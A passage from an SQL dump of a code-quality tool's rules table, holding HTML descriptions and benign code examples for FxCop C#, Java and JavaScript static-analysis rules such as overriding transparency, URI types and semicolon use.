                        <code>System.Xml.XPath.IXPathNavigable</code>
                      .
                    Using the interface decouples the member from a specific implementation of an XML data source.




</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, change the concrete type to the suggested interface.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            It is safe to suppress a message from this rule if the specific functionality provided by the concrete type is required.
</p>
<h2>Related Rules</h2>
<p>


                <code>CA1011: Consider passing base types as parameters</code>


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182160.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182160.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812581, 1510817812582, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (627, 'CA2134: Methods must keep consistent transparency when overriding base methods', 'MethodsMustOverrideWithConsistentTransparency', 'CA2134', 'fxcop', '<h2>Cause</h2>
<p>
            This rule fires when a method marked with the <code>SecurityCriticalAttribute</code> overrides a method that is transparent or marked with the <code>SecuritySafeCriticalAttribute</code>. The rule also fires when a method that is transparent or marked with the <code>SecuritySafeCriticalAttribute</code> overrides a method that is marked with a <code>SecurityCriticalAttribute</code>.
            The rule is applied when overriding a virtual method or implementing an interface.



</p>
<h2>Rule Description</h2>
<p>
            This rule fires on attempts to change the security accessibility of a method further up the inheritance chain. For example, if a virtual method in a base class is transparent or safe-critical, then the derived class must override it with a transparent or safe-critical method. Conversely, if the virtual is security critical, the derived class must override it with a security critical method. The same rule applies for implementing interface methods.
            Transparency rules are enforced when the code is JIT compiled instead of at runtime, so that the transparency calculation does not have dynamic type information. Therefore, the result of the transparency calculation must be able to be determined solely from the static types being JIT-compiled, regardless of the dynamic type.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, change the transparency of the method that is overriding a virtual method or implementing an interface to match the transparency of the virtual or interface method.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress warnings from this rule. Violations of this rule will result in a runtime <code>TypeLoadException</code> for assemblies that use level 2 transparency.
</p>
<h2>Examples</h2>

<h3>Code</h3>
<p>










            <pre>
using System;
using System.Security;

namespace TransparencyWarningsDemo
{

    public interface IInterface
    {
        void TransparentInterfaceMethod();

        [SecurityCritical]
        void CriticalInterfaceMethod();
    }

    public class Base
    {
        public virtual void TransparentVirtual() { }

        [SecurityCritical]
        public virtual void CriticalVirtual() { }
    }

    public class Derived : Base, IInterface
    {
        // CA2134 violation - implementing a transparent method with a critical one.  This can be fixed by any of: 
        //   1. Making IInterface.TransparentInterfaceMethod security critical 
        //   2. Making Derived.TransparentInterfaceMethod transparent 
        //   3. Making Derived.TransparentInterfaceMethod safe critical
        [SecurityCritical]
        public void TransparentInterfaceMethod() { }

        // CA2134 violation - implementing a critical method with a transparent one.  This can be fixed by any of: 
        //   1. Making IInterface.CriticalInterfaceMethod transparent 
        //   2. Making IInterface.CriticalInterfaceMethod safe critical 
        //   3. Making Derived.TransparentInterfaceMethod critical 
        public void CriticalInterfaceMethod() { }

        // CA2134 violation - overriding a transparent method with a critical one.  This can be fixed by any of: 
        //   1. Making Base.TrasnparentVirtual critical 
        //   2. Making Derived.TransparentVirtual transparent 
        //   3. Making Derived.TransparentVirtual safe critical
        [SecurityCritical]
        public override void TransparentVirtual() { }

        // CA2134 violation - overriding a critical method with a transparent one.  This can be fixed by any of: 
        //   1. Making Base.CriticalVirtual transparent 
        //   2. Making Base.CriticalVirtual safe critical 
        //   3. Making Derived.CriticalVirtual critical 
        public override void CriticalVirtual() { }
    }

}
</pre>





</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/dd997447.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/dd997447.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812582, 1510817812583, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (855, 'The default unnamed package should not be used', 'S1220', NULL, 'squid', '<p>According to the Java Language Specification:</p>
<blockquote>
  <p>Unnamed packages are provided by the Java platform principally for convenience when developing small or temporary applications or when just
  beginning development.</p>
</blockquote>
<p>To enforce this best practice, classes located in default package can no longer be accessed from named ones since Java 1.4.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyClass { /* ... */ }
</pre>
<h2>Compliant Solution</h2>
<pre>
package org.example;

public class MyClass{ /* ... */ }
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, 'convention', false, 'HTML', 1510817812884, 1510817812884, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (856, 'Methods should not be named "hashcode" or "equal"', 'S1221', NULL, 'squid', '<p>Naming a method <code>hashcode()</code> or <code>equal</code> is either:</p>
<ul>
  <li> A bug in the form of a typo. Overriding <code>Object.hashCode()</code> (note the camelCasing) or <code>Object.equals</code> (note the ''s'' on
  the end) was meant, and the application does not behave as expected. </li>
  <li> Done on purpose. The name however will confuse every other developer, who may not notice the naming difference, or who will think it is a bug.
  </li>
</ul>
<p>In both cases, the method should be renamed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public int hashcode() { /* ... */ }  // Noncompliant

public boolean equal(Object obj) { /* ... */ }  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
@Override
public int hashCode() { /* ... */ }

public boolean equals(Object obj) { /* ... */ }
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, 'pitfall', false, 'HTML', 1510817812884, 1510817812885, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1184, 'Wrapper objects should not be used for primitive types', 'PrimitiveWrappers', NULL, 'javascript', '<p>
  The use of wrapper objects for primitive types is gratuitous, confusing and dangerous. Simple literals should be used instead.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
var x = new Boolean(false);
if (x) {
  alert(''hi'');  // Shows ''hi''.
}
</pre>

<h2>Compliant Solution</h2>
<pre>
var x = false;
if (x) {
  alert(''hi'');
}
</pre>', 2, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '1min', NULL, NULL, 'pitfall', false, 'HTML', 1510817813311, 1510817813311, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (1185, 'Each statement should end with a semicolon', 'Semicolon', NULL, 'javascript', '<p>In JavaScript, the semicolon (<code>;</code>) is optional as a statement separator, but omitting semicolons can be confusing, and lead to unexpected results because a semicolon is implicitly inserted at the end of each line.</p>
<h2>Noncompliant Code Example</h2>

<pre>
function fun() {
  return  // Noncompliant. '';'' implicitly inserted at end of line
       5   // Noncompliant. '';'' implicitly inserted at end of line
}
print(fun());  // prints "undefined", not "5"
</pre>
<h2>Compliant Solution</h2>

<pre>
function fun() {
  return 5;
}
print(fun());
</pre>', 1, NULL, 'READY', 'js', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '1min', NULL, NULL, 'convention', false, 'HTML', 1510817813312, 1510817813312, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (628, 'CA1055: URI return values should not be strings', 'UriReturnValuesShouldNotBeStrings', 'CA1055', 'fxcop', '<h2>Cause</h2>
<p>
            The name of a method contains "uri", "Uri", "urn", "Urn", "url", or "Url", and the method returns a string.
</p>
<h2>Rule Description</h2>
<p>
            This rule splits the method name into tokens based on the Pascal casing convention and checks whether each token equals "uri", "Uri", "urn", "Urn", "url", or "Url". If there is a match, the rule assumes that the method returns a uniform resource identifier (URI). A string representation of a URI is prone to parsing and encoding errors, and can lead to security vulnerabilities. The <code>System.Uri</code> class provides these services in a safe and secure manner.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, change the return type to a <code>Uri</code>.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            It is safe to suppress a warning from this rule if the return value does not represent a URI.
</p>
<h2>Example</h2>
<p>


                {rule:fxcop:UriPropertiesShouldNotBeStrings}<br/>




                {rule:fxcop:UriParametersShouldNotBeStrings}<br/>




                {rule:fxcop:PassSystemUriObjectsInsteadOfStrings}<br/>




                {rule:fxcop:StringUriOverloadsCallSystemUriOverloads}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182176.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182176.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812584, 1510817812584, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (629, 'CA1815: Override equals and operator equals on value types', 'OverrideEqualsAndOperatorEqualsOnValueTypes', 'CA1815', 'fxcop', '<h2>Cause</h2>
<p>
            A public value type does not override <code>Object.Equals</code>, or does not implement the equality operator (==). This rule does not check enumerations.
</p>
<h2>Rule Description</h2>
<p>
            For value types, the inherited implementation of <code>Equals</code> uses the Reflection library, and compares the contents of all fields. Reflection is computationally expensive, and comparing every field for equality might be unnecessary. If you expect users to compare or sort instances, or use them as hash table keys, your value type should implement <code>Equals</code>. If your programming language supports operator overloading, you should also provide an implementation of the equality and inequality operators.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, provide an implementation of <code>Equals</code>. If you can, implement the equality operator.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            It is safe to suppress a warning from this rule if instances of the value type will not be compared to each other.
</p>
<h2>Example of a Violation</h2>

<h3>Description</h3>
<p>
                The following example shows a structure (value type) that violates this rule.
</p>
<h3>Code</h3>
<p>










            <pre>
using System;

namespace Samples
{
    // Violates this rule     
    public struct Point
    {
        private readonly int _X;
        private readonly int _Y;

        public Point(int x, int y)
        {
            _X = x;
            _Y = y;
        }

        public int X
        {
            get { return _X; }
        }

        public int Y
        {
            get { return _Y; }
        }
    }
}
</pre>





</p>
<h2>Example of How to Fix</h2>

<h3>Description</h3>
<p>
                The following example fixes the previous violation by overriding ValueType.Equals and implementing the equality operators (==, !=).
</p>
<h3>Code</h3>
<p>










            <pre>
using System;

namespace Samples
{
    public struct Point : IEquatable&lt;Point&gt;
    {
        private readonly int _X;
        private readonly int _Y;

        public Point(int x, int y)
        {
            _X = x;
            _Y = y;
        }

        public int X
        {
            get { return _X; }
        }

        public int Y
        {
            get { return _Y; }
        }

        public override int GetHashCode()
        {
            return _X ^ _Y;
        }

        public override bool Equals(object obj)
        {
            if (!(obj is Point))
                return false;

            return Equals((Point)obj);
        }

        public bool Equals(Point other)
        {
            if (_X != other._X)
                return false;

            return _Y == other._Y;
        }

        public static bool operator ==(Point point1, Point point2)
        {
            return point1.Equals(point2);
        }

        public static bool operator !=(Point point1, Point point2)
        {
            return !point1.Equals(point2);
        }
    }
}
</pre>





</p>
<h2>Related Rules</h2>
<p>


                {rule:fxcop:OverrideEqualsOnOverloadingOperatorEquals}<br/>




                {rule:fxcop:OverloadOperatorEqualsOnOverridingValueTypeEquals}<br/>




                {rule:fxcop:OperatorsShouldHaveSymmetricalOverloads}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182276.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182276.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '45min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812585, 1510817812586, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (631, 'CA2124: Wrap vulnerable finally clauses in outer try', 'WrapVulnerableFinallyClausesInOuterTry', 'CA2124', 'fxcop', '<h2>Cause</h2>
<p>
            In versions 1.0 and 1.1 of the .NET Framework, a public or protected method contains a <code>try</code>/<code>catch</code>/<code>finally</code> block. The <code>finally</code> block appears to reset security state and is not enclosed in a <code>finally</code> block.
</p>
<h2>Rule Description</h2>
<p>
            This rule locates <code>try</code>/<code>finally</code> blocks in code that targets versions 1.0 and 1.1 of the .NET Framework that might be vulnerable to malicious exception filters present in the call stack. If sensitive operations such as impersonation occur in the try block, and an exception is thrown, the filter can execute before the <code>finally</code> block. For the impersonation example, this means that the filter would execute as the impersonated user. Filters are currently implementable only in Visual Basic.





                    Caution





                      Note   In versions 2.0 and later of the .NET Framework, the runtime automatically protects a <code>try</code>/<code>catch</code>/ <code>finally</code> block from malicious exception filters, if the reset occurs directly within the method that contains the exception block.




</p>
<h2>How to Fix Violations</h2>
<p>
            Place the unwrapped <code>try</code>/<code>finally</code> in an outer try block. See the second example that follows. This forces the <code>finally</code> to execute before filter code.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule.
</p>
<h2>Pseudo-code Example</h2>

<h3>Description</h3>
<p>
                The following pseudo-code illustrates the pattern detected by this rule.
</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182322.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182322.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '45min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812588, 1510817812588, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (632, 'CA1003: Use generic event handler instances', 'UseGenericEventHandlerInstances', 'CA1003', 'fxcop', '<h2>Cause</h2>
<p>
            A type contains a delegate that returns void, whose signature contains two parameters (the first an object and the second a type that is assignable to EventArgs), and the containing assembly targets .NET Framework 2.0.
</p>
<h2>Rule Description</h2>
<p>
            Before .NET Framework 2.0, in order to pass custom information to the event handler, a new delegate had to be declared that specified a class that was derived from the <code>System.EventArgs</code> class. This is no longer true in .NET Framework 2.0, which introduced the System.EventHandler&lt;TEventArgs&gt; delegate. This generic delegate allows any class that is derived from <code>EventArgs</code> to be used together with the event handler.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, remove the delegate and replace its use by using the System.EventHandler&lt;TEventArgs&gt; delegate. If the delegate is autogenerated by the Visual Basic compiler, change the syntax of the event declaration to use the System.EventHandler&lt;TEventArgs&gt; delegate.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Do not suppress a warning from this rule.
</p>
<h2>Example</h2>
<p>


                {rule:fxcop:AvoidExcessiveParametersOnGenericTypes}<br/>




                {rule:fxcop:CollectionsShouldImplementGenericInterface}<br/>




                {rule:fxcop:DoNotDeclareStaticMembersOnGenericTypes}<br/>




                {rule:fxcop:DoNotExposeGenericLists}<br/>




                {rule:fxcop:DoNotNestGenericTypesInMemberSignatures}<br/>




                {rule:fxcop:GenericMethodsShouldProvideTypeParameter}<br/>




                {rule:fxcop:UseGenericsWhereAppropriate}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182178.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182178.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '45min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812589, 1510817812589, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (633, 'CA1304: Specify CultureInfo', 'SpecifyCultureInfo', 'CA1304', 'fxcop', '<h2>Cause</h2>
<p>
            A method or constructor calls a member that has an overload that accepts a <code>System.Globalization.CultureInfo</code> parameter, and the method or constructor does not call the overload that takes the <code>CultureInfo</code> parameter. This rule ignores calls to the following methods:
            <ul>
              <li>


                    <code>Activator.CreateInstance</code>


              </li>
              <li>


                    <code>ResourceManager.GetObject</code>


              </li>
              <li>


                    <code>ResourceManager.GetString</code>


              </li>
            </ul>
</p>
<h2>Rule Description</h2>
<p>
            When a <code>CultureInfo</code> or <code>System.IFormatProvider</code> object is not supplied, the default value that is supplied by the overloaded member might not have the effect that you want in all locales. Also, .NET Framework members choose default culture and formatting based on assumptions that might not be correct for your code. To ensure the code works as expected for your scenarios, you should supply culture-specific information according to the following guidelines:
            <ul>
              <li>
                If the value will be displayed to the user, use the current culture. See <code>CultureInfo.CurrentCulture</code>.
              </li>
              <li>
                If the value will be stored and accessed by software, that is, persisted to a file or database, use the invariant culture. See <code>CultureInfo.InvariantCulture</code>.
              </li>
              <li>
                If you do not know the destination of the value, have the data consumer or provider specify the culture.
              </li>
            </ul>
            Note that <code>CultureInfo.CurrentUICulture</code> is used only to retrieve localized resources by using an instance of the <code>System.Resources.ResourceManager</code> class.
            Even if the default behavior of the overloaded member is appropriate for your needs, it is better to explicitly call the culture-specific overload so that your code is self-documenting and more easily maintained.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, use the overload that takes a <code>CultureInfo</code> or <code>IFormatProvider</code> and specify the argument according to the guidelines that were listed earlier.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            It is safe to suppress a warning from this rule when it is certain that the default culture/format provider is the correct choice, and where code maintainability is not an important development priority.
</p>
<h2>Example</h2>
<p>


                {rule:fxcop:SpecifyIFormatProvider}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182189.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182189.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '45min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812590, 1510817812591, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (721, 'Classes from "sun.*" packages should not be used', 'S1191', NULL, 'squid', '<p>Classes in the <code>sun.*</code> or <code>com.sun.*</code> packages are considered implementation details, and are not part of the Java API.</p>
<p>They can cause problems when moving to new versions of Java because there is no backwards compatibility guarantee. Similarly, they can cause
problems when moving to a different Java vendor, such as OpenJDK.</p>
<p>Such classes are almost always wrapped by Java API classes that should be used instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
import com.sun.jna.Native;     // Noncompliant
import sun.misc.BASE64Encoder; // Noncompliant
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '20min', NULL, NULL, 'per "sun" import', NULL, 'lock-in,pitfall', false, 'HTML', 1510817812713, 1510817812714, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (897, 'Classes without "public" constructors should be "final"', 'S2974', NULL, 'squid', '<p>Classes with only <code>private</code> constructors should be marked <code>final</code> to prevent any mistaken extension attempts.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class PrivateConstructorClass {  // Noncompliant
  private PrivateConstructorClass() {
    // ...
  }

  public static int magic(){
    return 42;
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public final class PrivateConstructorClass {  // Compliant
  private PrivateConstructorClass() {
    // ...
  }

  public static int magic(){
    return 42;
  }
}
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'design', false, 'HTML', 1510817812932, 1510817812933, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (634, 'CA1804: Remove unused locals', 'RemoveUnusedLocals', 'CA1804', 'fxcop', '<h2>Cause</h2>
<p>
            A method declares a local variable but does not use the variable except possibly as the recipient of an assignment statement. For analysis by this rule, the tested assembly must be built with debugging information and the associated program database (.pdb) file must be available.
</p>
<h2>Rule Description</h2>
<p>
            Unused local variables and unnecessary assignments increase the size of an assembly and decrease performance.
</p>
<h2>How to Fix Violations</h2>
<p>
            To fix a violation of this rule, remove or use the local variable. Note that the C# compiler that is included with .NET Framework 2.0 removes unused local variables when the <code>optimize</code> option is enabled.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            Suppress a warning from this rule if the variable was compiler emitted. It is also safe to suppress a warning from this rule, or to disable the rule, if performance and code maintenance are not primary concerns.
</p>
<h2>Example</h2>
<p>


                {rule:fxcop:AvoidExcessiveLocals}<br/>




                {rule:fxcop:AvoidUncalledPrivateCode}<br/>




                {rule:fxcop:AvoidUninstantiatedInternalClasses}<br/>




                {rule:fxcop:ReviewUnusedParameters}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182278.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182278.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812591, 1510817812592, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (635, 'CA1057: String URI overloads call System.Uri overloads', 'StringUriOverloadsCallSystemUriOverloads', 'CA1057', 'fxcop', '<h2>Cause</h2>
<p>
            A type declares method overloads that differ only by the replacement of a string parameter with a <code>System.Uri</code> parameter, and the overload that takes the string parameter does not call the overload that takes the <code>Uri</code> parameter.
</p>
<h2>Rule Description</h2>
<p>
            Because the overloads differ only by the string/<code>Uri</code> parameter, the string is assumed to represent a uniform resource identifier (URI). A string representation of a URI is prone to parsing and encoding errors, and can lead to security vulnerabilities. The <code>Uri</code> class provides these services in a safe and secure manner. To reap the benefits of the <code>Uri</code> class, the string overload should call the <code>Uri</code> overload using the string argument.
</p>
<h2>How to Fix Violations</h2>
<p>
            Re-implement the method that uses the string representation of the URI so that it creates an instance of the <code>Uri</code> class using the string argument, and then passes the <code>Uri</code> object to the overload that has the <code>Uri</code> parameter.
</p>
<h2>When to Suppress Warnings</h2>
<p>
            It is safe to suppress a warning from this rule if the string parameter does not represent a URI.
</p>
<h2>Example</h2>
<p>


                {rule:fxcop:PassSystemUriObjectsInsteadOfStrings}<br/>




                {rule:fxcop:UriPropertiesShouldNotBeStrings}<br/>




                {rule:fxcop:UriParametersShouldNotBeStrings}<br/>




                {rule:fxcop:UriReturnValuesShouldNotBeStrings}


</p><h2>MSDN Documentation</h2>
<p><a href="http://msdn.microsoft.com/en-us/library/ms182170.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182170.aspx</a></p>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'LINEAR', NULL, '10min', NULL, NULL, NULL, NULL, NULL, false, 'HTML', 1510817812593, 1510817812593, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (725, '"java.lang.Error" should not be extended', 'S1194', NULL, 'squid', '<p><code>java.lang.Error</code> and its subclasses represent abnormal conditions, such as <code>OutOfMemoryError</code>, which should only be
encountered by the Java Virtual Machine.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyException extends Error { /* ... */ }       // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
public class MyException extends Exception { /* ... */ }   // Compliant
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, 'error-handling', false, 'HTML', 1510817812720, 1510817812720, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (726, 'Static fields should not be updated in constructors', 'S3010', NULL, 'squid', '<p>Assigning a value to a <code>static</code> field in a constructor could cause unreliable behavior at runtime since it will change the value for all
instances of the class.</p>
<p>Instead remove the field''s <code>static</code> modifier, or initialize it statically.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Person {
  static Date dateOfBirth;
  static int expectedFingers;

  public Person(date birthday) {
    dateOfBirth = birthday;  // Noncompliant; now everyone has this birthday
    expectedFingers = 10;  // Noncompliant
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Person {
  Date dateOfBirth;
  static int expectedFingers = 10;

  public Person(date birthday) {
    dateOfBirth = birthday;
  }
}
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, NULL, false, 'HTML', 1510817812721, 1510817812722, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (727, '"action" mappings should not have too many "forward" entries', 'S3373', NULL, 'squid', '<p>It makes sense to handle all related actions in the same place. Thus, the same <code>&lt;action&gt;</code> might logically handle all facets of
CRUD on an entity, with no confusion in the naming about which <code>&lt;forward/&gt;</code> handles which facet. But go very far beyond that, and it
becomes difficult to maintain a transparent naming convention. </p>
<p>So to ease maintenance, this rule raises an issue when an <code>&lt;action&gt;</code> has more than the allowed number of
<code>&lt;forward/&gt;</code> tags.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default threshold of 4:</p>
<pre>
&lt;action path=''/book'' type=''myapp.BookDispatchAction'' name=''form'' parameter=''method''&gt;
  &lt;forward name=''create'' path=''/WEB-INF/jsp/BookCreate.jspx'' redirect=''false''/&gt;
  &lt;forward name=''read'' path=''/WEB-INF/jsp/BookDetails'' redirect=''false''/&gt;
